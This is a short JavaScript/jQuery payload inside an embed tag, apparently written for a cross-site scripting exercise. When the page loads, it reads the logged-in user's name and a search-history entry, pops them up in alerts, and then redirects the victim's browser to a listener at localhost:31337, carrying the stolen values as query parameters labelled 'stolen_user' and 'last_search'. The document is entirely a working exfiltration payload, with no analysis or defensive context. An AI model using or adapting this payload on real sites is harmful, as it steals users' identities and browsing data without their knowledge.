<embed>
$( document ).ready(function() {
    var user = $( "#logged-in-user" ).text();
    var last = $( "div a.history-item:nth-child(2)" ).text();
    alert(user)
    alert(last)
    var url = "http://localhost:31337/?" + "stolen_user=" + user + "&" + "last_search=" + last;
    window.location.replace(url);
});
</embed>